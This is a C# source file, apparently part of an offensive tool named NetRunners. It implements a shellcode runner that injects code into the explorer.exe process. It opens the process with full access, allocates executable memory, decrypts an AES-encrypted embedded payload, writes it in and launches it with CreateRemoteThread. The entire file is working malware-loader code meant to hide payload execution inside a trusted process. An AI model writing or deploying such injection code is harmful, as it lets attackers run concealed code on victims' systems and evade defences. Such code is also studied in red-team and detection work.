using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using NetRunners.Interfaces;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Helpers.Helper;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Data.WinConstants;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Runners
{
    /// <summary>
    /// This class contains the Process Injection Shellcode Runner
    /// </summary>
    public class ProcessInjectionRunner : IRunner
    {
        // Process Injection Runner
        public void Run()
        {
            try
            {
                byte[] buf = GetPayload();
                int sBuf = GetSize();
                int explorerPID;
                IntPtr hProcess;
                IntPtr hThread;
                IntPtr outSize;
                IntPtr pRMemory;
                Process[] explorerProcesses;

                // get explorer pid
                explorerProcesses = Process.GetProcessesByName("explorer");
                explorerPID = explorerProcesses[0].Id;
                if (explorerPID == 0)
                    throw new Exception($"Failed retrieving explorer's PID");
                Console.WriteLine($"explorer pid: {explorerPID}");

                // open handle to target process 
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, (uint)explorerPID);
                if (hProcess == IntPtr.Zero)
                    throw new InvalidOperationException($"OpenProcess failed with error code: {Marshal.GetLastWin32Error()}");
                Console.WriteLine($"explorer process handle: {hProcess}");

                // allocate memory on remote process
                pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)sBuf, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);        // TO-DO USE EXEC_READ, THEN CHANGE PROTECT WITH VIRTUALPROTECTEX
                if (pRMemory == IntPtr.Zero)
                    throw new InvalidOperationException($"VirtualAlloc failed with error code: {Marshal.GetLastWin32Error()}");

                //decrypt buf
                try
                {
                    buf = DecryptBytesToBytesAes(buf, AesKey);
                }
                catch (Exception e)
                {
                    throw new InvalidOperationException("Decryption of buffer failed.", e);
                }

                // write to remote process memory
                WriteProcessMemory(hProcess, pRMemory, buf, buf.Length, out outSize);
                if (outSize == IntPtr.Zero)
                    throw new InvalidOperationException($"WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");

                // create remote thread to execute shellcode
                hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pRMemory, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                    throw new InvalidOperationException($"WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");
            }
            catch (Exception e)
            {
                // handle error
                Console.WriteLine($"An error occurred: {e.Message}");
                throw;
            }
        }
    }
}
